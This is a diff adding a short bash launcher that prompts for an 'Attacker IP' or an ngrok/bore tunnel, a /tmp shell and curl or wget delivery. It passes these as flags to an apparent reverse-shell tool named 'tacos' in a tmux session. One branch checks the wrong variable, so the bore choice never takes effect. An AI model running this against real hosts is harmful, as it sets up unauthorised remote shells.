@@ -1,0 +1,29 @@
+#!/usr/bin/env bash
+
+FLAGS=""
+
+EXPOSITION=$(gum choose "use IP" "tunnel: ngrok" "tunnel: bore")
+if [ "$EXPOSITION" = "use IP" ]; then
+    IP=$(gum input --placeholder "Enter Attacker IP")
+    FLAGS="${FLAGS} --lhost ${IP}"
+elif [ "$IP_CHOICE" = "tunnel: bore" ]; then
+    FLAGS="${FLAGS} -b"
+else
+    FLAGS="${FLAGS} -n"
+fi
+
+TMP=""
+gum confirm "Shell from /tmp directory ?" && FLAGS="${FLAGS} --tmp"
+
+if [ ! -f "tacos" ]; then
+    cp $HOME/.local/bin/tacos .
+fi
+
+CURL_OR_WGET=$(gum choose "use curl" "use wget")
+if [ "$CURL_OR_WGET" = "use curl" ]; then
+    FLAGS="${FLAGS}" #nothing
+elif [ "$CURL_OR_WGET" = "use wget" ]; then
+    FLAGS="${FLAGS} --wget"
+fi
+
+tmux new-session -s tacos "wrap ${FLAGS}"
